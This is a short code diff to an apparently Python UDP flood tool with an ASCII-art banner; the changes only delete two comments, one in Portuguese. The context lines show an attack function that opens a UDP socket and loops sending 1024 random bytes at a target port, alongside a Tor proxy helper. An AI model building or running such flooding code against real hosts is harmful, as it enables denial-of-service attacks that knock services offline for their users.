@@ -13,7 +13,6 @@ def clear_screen():
     else:
       os.system('clear')
 
-# ASCII Art
 ascii_art = """
 ██████╗ ███████╗██╗     ██████╗  ██████╗ ███████╗
 ██╔══██╗██╔════╝██║     ██╔══██╗██╔═══██╗██╔════╝
@@ -33,7 +32,7 @@ def use_tor_proxy():
 
 def attack(target, port, thread_id):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    packet = random._urandom(1024)  # Pacote de 1024 bytes
+    packet = random._urandom(1024)
     
     while True:
         try:
